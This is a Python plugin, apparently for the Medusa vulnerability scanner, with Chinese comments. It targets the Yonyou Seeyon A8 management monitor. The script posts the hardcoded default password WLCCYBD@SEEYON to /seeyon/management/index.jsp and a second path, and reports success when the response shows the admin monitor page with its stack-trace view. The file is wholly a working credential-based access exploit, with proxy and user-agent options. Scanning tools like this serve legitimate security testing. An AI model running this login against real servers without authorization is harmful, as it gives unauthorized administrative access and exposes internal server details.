#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友a8监控后台默认密码漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0157458
author: Lucifer
description: 路径seeyon/management/status.jsp存在默认密码WLCCYBD@SEEYON。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


post_data = {"password": "WLCCYBD@SEEYON"}
payloads = {"/seeyon/management/index.jsp",
            "/management/index.jsp"}
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        for payload in payloads:
            payload_url = scheme+"://"+url+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('a8 management monitor')!=-1 and con.lower().find('connections stack trace')!=-1:
                Medusa = "{} 存在用友a8监控后台默认密码漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
                return (Medusa)
    except Exception as e:
        pass